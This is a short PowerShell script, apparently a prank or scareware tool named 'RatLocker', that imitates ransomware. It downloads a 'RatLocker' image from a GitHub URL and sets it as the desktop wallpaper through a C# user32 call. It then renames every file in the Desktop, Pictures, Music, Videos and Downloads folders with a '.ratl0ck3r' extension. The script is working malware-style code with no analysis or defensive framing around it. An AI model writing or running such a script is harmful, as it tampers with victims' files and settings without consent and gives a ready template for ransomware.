Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination $HOME\AppData\Local\Temp\YourOldWallpaper.png
Invoke-WebRequest https://raw.githubusercontent.com/WalkTheEarth/ratlocker/main/RatLocker.png -OutFile $HOME\AppData\Local\Temp\RatLocker.png
$MyWallpaper="$HOME\AppData\Local\Temp\RatLocker.png"
$code = @'
using System.Runtime.InteropServices;
namespace Win32{
      public class Wallpaper{
      [DllImport("user32.dll", CharSet=CharSet.Auto)]
      static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ;
      public static void SetWallpaper(string thePath){
      SystemParametersInfo(20,0,thePath,3);
      }
    }
}
'@
add-type $code 
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
dir $HOME\Desktop\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
dir $HOME\Pictures\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
dir $HOME\Music\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
dir $HOME\Videos\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
dir $HOME\Downloads\* | Rename-Item -NewName {$_.name + ".ratl0ck3r"}
